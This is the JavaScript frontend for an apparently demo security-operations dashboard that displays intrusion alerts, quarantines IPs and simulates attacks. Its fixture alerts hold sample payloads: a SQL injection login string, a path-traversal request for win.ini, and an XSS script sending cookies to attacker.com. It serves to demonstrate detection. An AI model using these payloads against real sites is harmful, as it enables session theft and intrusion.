/**
 * NetSentinel SOC - Frontend Application Controller
 * High-performance, dual-mode SOC Dashboard.
 * Works seamlessly both connected to the Backend (http://) AND directly in browser (file://).
 */

// Configuration & State
const isFileProtocol = window.location.protocol === 'file:';
const API_BASE = isFileProtocol ? '' : window.location.origin;

async function logoutNetSentinel() {
  if (!isFileProtocol) {
    try {
      const controller = new AbortController();
      setTimeout(() => controller.abort(), 2000);
      await fetch(`${API_BASE}/api/auth/logout`, { method: 'POST', signal: controller.signal });
    } catch (e) { /* server may be asleep — clear local state anyway */ }
  }
  try {
    sessionStorage.removeItem('netsentinel_user');
    localStorage.removeItem('netsentinel_user');
  } catch (e) { /* ignore */ }
  if (isFileProtocol) {
    window.location.href = '../frontend/login.html';
  } else {
    window.location.href = '/login.html';
  }
}

// Auth gate: the marketing site (frontend/) handles login/register.
// When the SOC app is served over HTTP without an account, send the
// user back through the landing flow. Direct file:// opening stays
// open so the standalone demo keeps working.
(async function requireNetSentinelAuth() {
  if (isFileProtocol) return;
  let user = null;
  try {
    user = sessionStorage.getItem('netsentinel_user') || localStorage.getItem('netsentinel_user');
  } catch (e) { /* storage unavailable */ }
  if (!user) {
    window.location.replace('/login.html');
    throw new Error('Redirecting to login');
  }
  try {
    const res = await fetch(`${API_BASE}/api/auth/me`, { credentials: 'same-origin' });
    if (!res.ok) {
      try {
        sessionStorage.removeItem('netsentinel_user');
        localStorage.removeItem('netsentinel_user');
      } catch (e) { /* ignore */ }
      window.location.replace('/login.html');
      throw new Error('Session expired, redirecting to login');
    }
  } catch (err) {
    if (err && err.message && err.message.indexOf('redirecting') !== -1) throw err;
    // Server unreachable (e.g. detector-only mode) — keep the local gate result.
    console.warn('Could not verify server session; continuing with local auth.');
  }
})();

let currentAlerts = [];
let selectedAlertForModal = null;
let pollTimer = null;
const POLL_INTERVAL = 2000;

// In-Memory Simulation State (for Direct Browser / Standalone execution)
const localState = {
  packetsInspected: 1420,
  threatScore: 65,
  threatLevel: "HIGH",
  quarantine: [
    { ip: "198.51.100.14", reason: "Preemptive Blacklist: Known Mirai Botnet Node", timestamp: "2026-11-07 20:30:15", severity: "HIGH" },
    { ip: "45.33.32.156", reason: "Automated Reconnaissance Probing", timestamp: "2026-11-07 20:45:22", severity: "MEDIUM" }
  ],
  alerts: [
    {
      id: "ALT-202611072045-001",
      timestamp: "2026-11-07 20:45:22",
      source_ip: "45.33.32.156",
      source_port: 41702,
      dest_ip: "192.168.1.10",
      dest_port: 80,
      protocol: "TCP",
      attack_type: "Network Reconnaissance (Port Scan)",
      severity: "MEDIUM",
      description: "Host probed 4 ports within 3.0s: [21, 80, 443, 3306]",
      payload_preview: "Probed ports: 21, 80, 443, 3306",
      action_taken: "FLAGGED",
      recommendation: "Block probing IP at perimeter edge firewall."
    },
    {
      id: "ALT-202611072046-002",
      timestamp: "2026-11-07 20:46:10",
      source_ip: "10.0.0.45",
      source_port: 57066,
      dest_ip: "192.168.1.10",
      dest_port: 80,
      protocol: "TCP",
      attack_type: "TCP Flood (DoS)",
      severity: "HIGH",
      description: "High packet volume detected: 35 packets in 2.0s window",
      payload_preview: "Packet size: 64 bytes, Flags: SYN",
      action_taken: "RATE_LIMITED",
      recommendation: "Activate SYN cookies and deploy upstream rate-limiting."
    },
    {
      id: "ALT-202611072047-003",
      timestamp: "2026-11-07 20:47:05",
      source_ip: "172.16.5.99",
      source_port: 59691,
      dest_ip: "192.168.1.10",
      dest_port: 80,
      protocol: "HTTP",
      attack_type: "SQL Injection",
      severity: "CRITICAL",
      description: "Exploit pattern matched [SIG-SQLI-001 - CWE-89]: ' OR '1'='1'",
      payload_preview: "GET /login?user=admin' OR '1'='1'--&pass=x HTTP/1.1",
      action_taken: "AUTO_QUARANTINED",
      recommendation: "Use parameterized queries / prepared statements."
    },
    {
      id: "ALT-202611072048-004",
      timestamp: "2026-11-07 20:48:19",
      source_ip: "203.0.113.88",
      source_port: 44647,
      dest_ip: "192.168.1.10",
      dest_port: 8080,
      protocol: "HTTP",
      attack_type: "Cross-Site Scripting (XSS)",
      severity: "HIGH",
      description: "Exploit pattern matched [SIG-XSS-001 - CWE-79]: <script>",
      payload_preview: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
      action_taken: "FLAGGED",
      recommendation: "Sanitize user inputs and enforce Content Security Policy (CSP)."
    }
  ],
  protocols: { TCP: 680, HTTP: 320, HTTPS: 240, UDP: 110, DNS: 55, SSH: 15 },
  topAttackers: { "172.16.5.99": 14, "10.0.0.45": 11, "45.33.32.156": 8, "203.0.113.88": 5, "198.51.100.14": 4 }
};

// DOM Elements
const kpiPackets = document.getElementById('kpiPackets');
const kpiAlerts = document.getElementById('kpiAlerts');
const kpiAlertsBreakdown = document.getElementById('kpiAlertsBreakdown');
const kpiThreatScore = document.getElementById('kpiThreatScore');
const kpiThreatBadge = document.getElementById('kpiThreatBadge');
const kpiQuarantine = document.getElementById('kpiQuarantine');
const alertsTableBody = document.getElementById('alertsTableBody');
const protocolStatsList = document.getElementById('protocolStatsList');
const topAttackersList = document.getElementById('topAttackersList');
const quarantineList = document.getElementById('quarantineList');
const forensicModal = document.getElementById('forensicModal');
const toastContainer = document.getElementById('toastContainer');
const engineStatusText = document.getElementById('engineStatusText');

// Initialization
document.addEventListener('DOMContentLoaded', () => {
  renderLocalDashboard();

  if (!isFileProtocol) {
    fetchStats();
    fetchAlerts();
    fetchQuarantine();
    startPolling();
  } else {
    engineStatusText.textContent = "WINDOWS BROWSER MODE (ACTIVE)";
    engineStatusText.style.color = "var(--cyber-cyan)";
    // Light background packet generator
    setInterval(() => {
      localState.packetsInspected += Math.floor(Math.random() * 8) + 1;
      kpiPackets.textContent = localState.packetsInspected.toLocaleString();
    }, 2000);
  }
});

function startPolling() {
  if (pollTimer) clearInterval(pollTimer);
  pollTimer = setInterval(async () => {
    await fetchStats();
    await fetchAlerts();
    await fetchQuarantine();
  }, POLL_INTERVAL);
}

// 1. Fetch & Render Telemetry Statistics
async function fetchStats() {
  if (isFileProtocol) return;
  try {
    const res = await fetch(`${API_BASE}/api/stats`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();

    kpiPackets.textContent = Number(data.packets_inspected || 0).toLocaleString();
    kpiAlerts.textContent = data.total_alerts || 0;

    const sevs = data.severities || {};
    kpiAlertsBreakdown.textContent = `${sevs.CRITICAL || 0} Crit · ${sevs.HIGH || 0} High · ${sevs.MEDIUM || 0} Med · ${sevs.LOW || 0} Low`;

    const score = data.threat_score || 0;
    const level = data.threat_level || 'NORMAL';
    kpiThreatScore.innerHTML = `${score}<span style="font-size:1.1rem; color:var(--text-muted);">/100</span>`;
    
    kpiThreatBadge.textContent = level;
    kpiThreatBadge.className = `threat-badge threat-${level}`;

    kpiQuarantine.textContent = data.quarantined_ips || 0;

    renderProtocols(data.protocols || {});
    renderTopAttackers(data.top_attackers || {});

    engineStatusText.textContent = "DETECTOR CONNECTED (ONLINE)";
    engineStatusText.style.color = "var(--cyber-green)";
  } catch (err) {
    // Graceful fallback to client simulation state
    engineStatusText.textContent = "STANDALONE MODE (ACTIVE)";
    engineStatusText.style.color = "var(--cyber-cyan)";
  }
}

// 2. Fetch & Render Live Security Alerts
async function fetchAlerts() {
  if (isFileProtocol) return;
  try {
    const sevFilter = document.getElementById('severityFilter').value;
    const res = await fetch(`${API_BASE}/api/alerts?limit=50&severity=${encodeURIComponent(sevFilter)}`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const alerts = await res.json();
    currentAlerts = alerts;
    renderAlertsTable(alerts);
  } catch (err) {
    console.warn("Backend not reached, using local view");
  }
}

function renderLocalDashboard() {
  kpiPackets.textContent = localState.packetsInspected.toLocaleString();
  kpiAlerts.textContent = localState.alerts.length;

  let crit = 0, high = 0, med = 0, low = 0;
  localState.alerts.forEach(a => {
    if (a.severity === 'CRITICAL') crit++;
    else if (a.severity === 'HIGH') high++;
    else if (a.severity === 'MEDIUM') med++;
    else low++;
  });
  kpiAlertsBreakdown.textContent = `${crit} Crit · ${high} High · ${med} Med · ${low} Low`;

  kpiThreatScore.innerHTML = `${localState.threatScore}<span style="font-size:1.1rem; color:var(--text-muted);">/100</span>`;
  kpiThreatBadge.textContent = localState.threatLevel;
  kpiThreatBadge.className = `threat-badge threat-${localState.threatLevel}`;

  kpiQuarantine.textContent = localState.quarantine.length;

  currentAlerts = localState.alerts;
  renderAlertsTable(currentAlerts);
  renderProtocols(localState.protocols);
  renderTopAttackers(localState.topAttackers);
  renderQuarantine(localState.quarantine);
}

function renderAlertsTable(alerts) {
  if (!alerts || alerts.length === 0) {
    alertsTableBody.innerHTML = `
      <tr>
        <td colspan="8" style="text-align:center; color:var(--text-muted); padding:2rem;">
          No intrusion events recorded for selected filter. System listening on all ports.
        </td>
      </tr>`;
    return;
  }

  const query = document.getElementById('alertSearchInput').value.toLowerCase().trim();
  const filtered = query ? alerts.filter(a => 
    (a.source_ip && a.source_ip.toLowerCase().includes(query)) ||
    (a.attack_type && a.attack_type.toLowerCase().includes(query)) ||
    (a.dest_port && a.dest_port.toString().includes(query))
  ) : alerts;

  alertsTableBody.innerHTML = filtered.map(alert => `
    <tr>
      <td style="font-family:var(--font-mono); font-size:0.75rem; color:var(--text-muted);">${alert.timestamp || 'N/A'}</td>
      <td><span class="severity-pill ${alert.severity}">${alert.severity}</span></td>
      <td style="font-weight:600; color:var(--text-bright);">${escapeHtml(alert.attack_type)}</td>
      <td><span class="mono-ip">${escapeHtml(alert.source_ip)}</span></td>
      <td><span class="mono-port">:${alert.dest_port}</span></td>
      <td><span style="font-size:0.75rem; font-family:var(--font-mono);">${escapeHtml(alert.protocol)}</span></td>
      <td>
        <span class="action-chip ${alert.action_taken === 'AUTO_QUARANTINED' ? 'quarantined' : ''}">
          ${escapeHtml(alert.action_taken || 'FLAGGED')}
        </span>
      </td>
      <td>
        <div style="display:flex; gap:0.4rem;">
          <button class="btn btn-outline btn-sm" onclick="openModal('${alert.id}')" title="Inspect Exploit Payload">Inspect</button>
          <button class="btn btn-danger btn-sm" onclick="quickQuarantine('${alert.source_ip}', '${escapeHtml(alert.attack_type)}')" title="Quarantine Host">Block</button>
        </div>
      </td>
    </tr>
  `).join('');
}

function filterTableSearch() {
  renderAlertsTable(currentAlerts);
}

// 3. Render Telemetry Protocol Distributions
function renderProtocols(protocols) {
  const total = Object.values(protocols).reduce((a, b) => a + b, 0) || 1;
  const keys = ['TCP', 'HTTP', 'HTTPS', 'UDP', 'DNS', 'SSH'];

  protocolStatsList.innerHTML = keys.map(k => {
    const val = protocols[k] || 0;
    const pct = Math.min(100, Math.round((val / total) * 100));
    let colorClass = 'bar';
    if (k === 'HTTP' || k === 'HTTPS') colorClass += ' green';
    else if (k === 'DNS') colorClass += ' amber';
    else if (k === 'SSH') colorClass += ' red';

    return `
      <div class="stat-item">
        <div class="stat-header">
          <span class="stat-title">${k}</span>
          <span class="stat-val">${val} pkts (${pct}%)</span>
        </div>
        <div class="progress-track">
          <div class="progress-bar ${colorClass}" style="width: ${pct}%"></div>
        </div>
      </div>
    `;
  }).join('');
}

// 4. Render Top Attacker IPs
function renderTopAttackers(attackers) {
  const entries = Object.entries(attackers);
  if (entries.length === 0) {
    topAttackersList.innerHTML = `<div style="font-size:0.75rem; color:var(--text-muted); text-align:center; padding:1rem;">No malicious IP activity recorded yet.</div>`;
    return;
  }

  const maxVal = Math.max(...entries.map(e => e[1])) || 1;

  topAttackersList.innerHTML = entries.map(([ip, count]) => {
    const pct = Math.min(100, Math.round((count / maxVal) * 100));
    return `
      <div class="stat-item">
        <div class="stat-header">
          <span class="mono-ip">${escapeHtml(ip)}</span>
          <span class="stat-val" style="color:var(--cyber-red);">${count} attacks</span>
        </div>
        <div class="progress-track">
          <div class="progress-bar red" style="width: ${pct}%"></div>
        </div>
      </div>
    `;
  }).join('');
}

// 5. Fetch & Render Quarantine List
async function fetchQuarantine() {
  if (isFileProtocol) return;
  try {
    const res = await fetch(`${API_BASE}/api/quarantine`);
    if (!res.ok) return;
    const items = await res.json();
    renderQuarantine(items);
  } catch (err) {}
}

function renderQuarantine(items) {
  const fwCountEl = document.getElementById('firewallRuleCount');
  if (fwCountEl) fwCountEl.textContent = `${items ? items.length : 0} Active`;

  if (!items || items.length === 0) {
    quarantineList.innerHTML = `<div style="font-size:0.75rem; color:var(--text-muted); text-align:center; padding:1rem;">No hosts currently quarantined.</div>`;
    return;
  }

  quarantineList.innerHTML = items.map(item => `
    <div class="quarantine-card">
      <div class="quarantine-info">
        <span class="quarantine-ip">${escapeHtml(item.ip)}</span>
        <span class="quarantine-reason">${escapeHtml(item.reason)}</span>
        <div class="quarantine-fw-tag">
          <span>${item.firewall_status === 'SIMULATION_ONLY' ? 'SIMULATION QUARANTINE' : `RULE: NetSentinel-Block-${escapeHtml(item.ip)}`}</span>
          ${item.firewall_status === 'SIMULATION_ONLY' ? '[NO OS FIREWALL RULE]' : `[${escapeHtml(item.firewall_status || 'QUEUED')}]`}
        </div>
      </div>
      <button class="btn btn-outline btn-sm" onclick="unblockIp('${item.ip}')" style="font-size:0.7rem;">Unblock</button>
    </div>
  `).join('');
}

function downloadFirewallBatch() {
  if (!isFileProtocol) {
    window.open(`${API_BASE}/api/firewall/download`, '_blank');
    showToast("Downloaded Windows Firewall elevated sync script (.bat)", "success");
    return;
  }

  // Client-side batch generator for direct browser execution
  let bat = "@echo off\r\n";
  bat += ":: NetSentinel Windows Defender Firewall Sync Script\r\n";
  bat += "echo ======================================================================\r\n";
  bat += "echo   NetSentinel IPS - Synchronizing Windows Defender Firewall\r\n";
  bat += "echo ======================================================================\r\n";
  bat += "net session >nul 2>&1\r\n";
  bat += "if %ERRORLEVEL% NEQ 0 (\r\n";
  bat += "    echo [ERROR] Administrator privileges required.\r\n";
  bat += "    echo Right-click this file and select 'Run as administrator'.\r\n";
  bat += "    pause\r\n";
  bat += "    exit /b 1\r\n";
  bat += ")\r\n";
  bat += "echo [INFO] Enforcing inbound block rules...\r\n";

  localState.quarantine.forEach(q => {
    bat += `netsh advfirewall firewall delete rule name="NetSentinel-Block-${q.ip}" >nul 2>&1\r\n`;
    bat += `netsh advfirewall firewall add rule name="NetSentinel-Block-${q.ip}" dir=in action=block remoteip=${q.ip} description="NetSentinel IPS Block"\r\n`;
  });

  bat += "echo [SUCCESS] Windows Defender Firewall rules synchronized successfully!\r\n";
  bat += "pause\r\n";

  const blob = new Blob([bat], { type: "application/bat" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.setAttribute("href", url);
  link.setAttribute("download", "apply_firewall_rules.bat");
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  showToast("Generated apply_firewall_rules.bat (Run as Administrator)", "success");
}

// 6. Active Defense Action Triggers
async function quickQuarantine(ip, reason) {
  if (!ip) return;
  if (!isFileProtocol) {
    try {
      const res = await fetch(`${API_BASE}/api/quarantine`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip, reason: `Manual Block: ${reason}`, severity: 'HIGH' })
      });
      if (res.ok) {
        showToast(`Host ${ip} quarantined successfully`, 'danger');
        fetchQuarantine();
        fetchStats();
        return;
      }
    } catch (err) {}
  }

  // Local state update
  if (!localState.quarantine.some(q => q.ip === ip)) {
    localState.quarantine.unshift({
      ip: ip,
      reason: `Manual Block: ${reason}`,
      timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
      severity: 'HIGH'
    });
    kpiQuarantine.textContent = localState.quarantine.length;
    renderQuarantine(localState.quarantine);
    showToast(`Host ${ip} quarantined`, 'danger');
  }
}

async function unblockIp(ip) {
  if (!ip) return;
  if (!isFileProtocol) {
    try {
      const res = await fetch(`${API_BASE}/api/quarantine`, {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip })
      });
      if (res.ok) {
        showToast(`Host ${ip} removed from quarantine`, 'success');
        fetchQuarantine();
        fetchStats();
        return;
      }
    } catch (err) {}
  }

  localState.quarantine = localState.quarantine.filter(q => q.ip !== ip);
  kpiQuarantine.textContent = localState.quarantine.length;
  renderQuarantine(localState.quarantine);
  showToast(`Host ${ip} unblocked`, 'success');
}

async function submitManualBlock() {
  const input = document.getElementById('manualBlockIp');
  const ip = input.value.trim();
  if (!ip) return;
  await quickQuarantine(ip, 'Manual SOC Console Directive');
  input.value = '';
}

// 7. Trigger Cyber Attack Simulations
async function triggerSimulation(type) {
  showToast(`Simulating ${type.toUpperCase()} attack vector...`, 'normal');

  if (!isFileProtocol) {
    try {
      const res = await fetch(`${API_BASE}/api/simulate`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type })
      });
      if (res.ok) {
        setTimeout(() => {
          fetchAlerts();
          fetchStats();
          fetchQuarantine();
        }, 300);
        return;
      }
    } catch (err) {}
  }

  // Client Simulation Engine
  const nowStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
  const simIps = ["198.51.100.14", "172.16.5.99", "10.0.0.45", "45.33.32.156", "203.0.113.88"];
  const randomIp = simIps[Math.floor(Math.random() * simIps.length)];
  let newAlert = null;

  switch (type.toLowerCase()) {
    case 'portscan':
      newAlert = {
        id: `ALT-${Date.now()}`,
        timestamp: nowStr,
        source_ip: randomIp,
        source_port: Math.floor(Math.random() * 20000) + 40000,
        dest_ip: "192.168.1.10",
        dest_port: 80,
        protocol: "TCP",
        attack_type: "Network Reconnaissance (Port Scan)",
        severity: "MEDIUM",
        description: "Host probed 6 ports within 3.0s: [21, 22, 80, 443, 3306, 8080]",
        payload_preview: "Probed ports: 21, 22, 80, 443, 3306, 8080",
        action_taken: "FLAGGED",
        recommendation: "Block probing IP at perimeter edge firewall."
      };
      break;
    case 'dos':
      newAlert = {
        id: `ALT-${Date.now()}`,
        timestamp: nowStr,
        source_ip: randomIp,
        source_port: Math.floor(Math.random() * 20000) + 40000,
        dest_ip: "192.168.1.10",
        dest_port: 80,
        protocol: "TCP",
        attack_type: "TCP Flood (DoS)",
        severity: "HIGH",
        description: "High packet volume detected: 52 packets in 2.0s window",
        payload_preview: "Packet size: 64 bytes, Flags: SYN",
        action_taken: "RATE_LIMITED",
        recommendation: "Activate SYN cookies and deploy upstream rate-limiting."
      };
      break;
    case 'sqli':
      newAlert = {
        id: `ALT-${Date.now()}`,
        timestamp: nowStr,
        source_ip: randomIp,
        source_port: Math.floor(Math.random() * 20000) + 40000,
        dest_ip: "192.168.1.10",
        dest_port: 80,
        protocol: "HTTP",
        attack_type: "SQL Injection",
        severity: "CRITICAL",
        description: "Exploit pattern matched [SIG-SQLI-001 - CWE-89]: ' OR '1'='1'",
        payload_preview: "GET /login?user=admin' OR '1'='1'--&pass=x HTTP/1.1",
        action_taken: "AUTO_QUARANTINED",
        recommendation: "Use parameterized queries / prepared statements."
      };
      break;
    case 'xss':
      newAlert = {
        id: `ALT-${Date.now()}`,
        timestamp: nowStr,
        source_ip: randomIp,
        source_port: Math.floor(Math.random() * 20000) + 40000,
        dest_ip: "192.168.1.10",
        dest_port: 8080,
        protocol: "HTTP",
        attack_type: "Cross-Site Scripting (XSS)",
        severity: "HIGH",
        description: "Exploit pattern matched [SIG-XSS-001 - CWE-79]: <script>",
        payload_preview: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
        action_taken: "FLAGGED",
        recommendation: "Sanitize user inputs and enforce Content Security Policy (CSP)."
      };
      break;
    case 'traversal':
      newAlert = {
        id: `ALT-${Date.now()}`,
        timestamp: nowStr,
        source_ip: randomIp,
        source_port: Math.floor(Math.random() * 20000) + 40000,
        dest_ip: "192.168.1.10",
        dest_port: 80,
        protocol: "HTTP",
        attack_type: "Path Traversal",
        severity: "HIGH",
        description: "Exploit pattern matched [SIG-TRAV-001 - CWE-22]: ../../",
        payload_preview: "GET /view?file=../../../../windows/win.ini HTTP/1.1",
        action_taken: "FLAGGED",
        recommendation: "Restrict path resolution to trusted root."
      };
      break;
    case 'scanner':
      newAlert = {
        id: `ALT-${Date.now()}`,
        timestamp: nowStr,
        source_ip: randomIp,
        source_port: Math.floor(Math.random() * 20000) + 40000,
        dest_ip: "192.168.1.10",
        dest_port: 80,
        protocol: "HTTP",
        attack_type: "Reconnaissance Scan",
        severity: "MEDIUM",
        description: "Automated vulnerability scanner signature matched: sqlmap",
        payload_preview: "User-Agent: sqlmap/1.6#stable (https://sqlmap.org)",
        action_taken: "FLAGGED",
        recommendation: "Block known malicious scanner user-agents."
      };
      break;
    case 'bruteforce':
      newAlert = {
        id: `ALT-${Date.now()}`,
        timestamp: nowStr,
        source_ip: randomIp,
        source_port: Math.floor(Math.random() * 20000) + 40000,
        dest_ip: "192.168.1.10",
        dest_port: 22,
        protocol: "SSH",
        attack_type: "SSH Brute Force",
        severity: "HIGH",
        description: "Rapid connection attempts (6) to authentication service on port 22",
        payload_preview: "SSH-2.0-OpenSSH_8.2p1 Failed password for root",
        action_taken: "FLAGGED",
        recommendation: "Enforce multi-factor authentication and fail2ban."
      };
      break;
    default:
      return;
  }

  localState.alerts.unshift(newAlert);
  localState.topAttackers[randomIp] = (localState.topAttackers[randomIp] || 0) + 1;
  localState.packetsInspected += Math.floor(Math.random() * 25) + 15;

  if (newAlert.severity === 'CRITICAL') {
    localState.quarantine.unshift({
      ip: newAlert.source_ip,
      reason: `Auto-Mitigation: ${newAlert.attack_type}`,
      timestamp: nowStr,
      severity: 'CRITICAL'
    });
  }

  renderLocalDashboard();
}

// 8. Forensic Inspection Modal
function openModal(alertId) {
  const alert = currentAlerts.find(a => a.id === alertId);
  if (!alert) return;

  selectedAlertForModal = alert;
  document.getElementById('modalAlertTitle').textContent = `Incident Forensic: ${alert.attack_type}`;
  document.getElementById('modalAlertId').textContent = alert.id;
  document.getElementById('modalTimestamp').textContent = alert.timestamp;
  document.getElementById('modalFlow').textContent = `${alert.source_ip}:${alert.source_port} -> ${alert.dest_ip}:${alert.dest_port}`;
  document.getElementById('modalProtocol').textContent = alert.protocol;
  
  const sevEl = document.getElementById('modalSeverity');
  sevEl.textContent = alert.severity;
  sevEl.className = `severity-pill ${alert.severity}`;

  document.getElementById('modalAttackType').textContent = alert.attack_type;
  document.getElementById('modalDescription').textContent = alert.description;
  document.getElementById('modalPayload').textContent = alert.payload_preview || 'No payload bytes captured (header-only or raw syn packet).';
  document.getElementById('modalRecommendation').textContent = alert.recommendation || 'Enforce defense-in-depth and patch vulnerable endpoints.';

  forensicModal.classList.add('active');
}

function closeModal() {
  forensicModal.classList.remove('active');
  selectedAlertForModal = null;
}

function quarantineFromModal() {
  if (selectedAlertForModal && selectedAlertForModal.source_ip) {
    quickQuarantine(selectedAlertForModal.source_ip, selectedAlertForModal.attack_type);
    closeModal();
  }
}

// 9. Export Report & Clear Logs
function exportCsvReport() {
  if (!isFileProtocol) {
    window.open(`${API_BASE}/api/export`, '_blank');
    return;
  }

  // Client-side CSV generation
  let csv = "Alert_ID,Timestamp,Source_IP,Source_Port,Dest_IP,Dest_Port,Protocol,Attack_Type,Severity,Action_Taken,Recommendation\n";
  localState.alerts.forEach(a => {
    const rec = (a.recommendation || '').replace(/"/g, '""');
    csv += `"${a.id}","${a.timestamp}","${a.source_ip}",${a.source_port},"${a.dest_ip}",${a.dest_port},"${a.protocol}","${a.attack_type}","${a.severity}","${a.action_taken}","${rec}"\n`;
  });

  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.setAttribute("href", url);
  link.setAttribute("download", "netsentinel_report.csv");
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
  showToast("Exported forensic report as CSV", "success");
}

// Secure Alert History Clearing
async function clearAlertHistory() {
  if (!confirm('Are you sure you want to clear alert history?')) {
    return;
  }

  if (!isFileProtocol) {
    try {
      const res = await fetch(`${API_BASE}/api/alerts`, { method: 'DELETE' });
      if (res.ok) {
        renderLocalDashboard();
        showToast('Alert logs cleared successfully', 'success');
        return;
      }
    } catch (error) {
      console.error('Unable to clear alert history:', error);
    }
  }

  try {
    localState.alerts = [];
    renderLocalDashboard();
    showToast('Alert logs cleared successfully', 'success');
  } catch (error) {
    console.error('Unable to clear alert history:', error);
    showToast('Failed to clear alert history', 'error');
  }
}


// Secure Toast Notifications Helper
function showToast(message, type = 'normal') {
    const allowedTypes = ['normal', 'success', 'error', 'warning', 'danger'];

    // Validate notification type
    const safeType = allowedTypes.includes(type)
        ? type
        : 'normal';

    // Create toast safely
    const toast = document.createElement('div');
    toast.className = `toast ${safeType}`;

    // Never use innerHTML for untrusted messages
    toast.textContent = String(message ?? '');

    // Append to container
    toastContainer.appendChild(toast);

    // Remove toast safely
    setTimeout(() => {
        toast.remove();
    }, 3500);
}


// Secure HTML Escaping Helper
function escapeHtml(value) {
    if (value === null || value === undefined) {
        return '';
    }

    return String(value).replace(/[&<>"']/g, function(char) {
        const entities = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;'
        };

        return entities[char];
    });
}

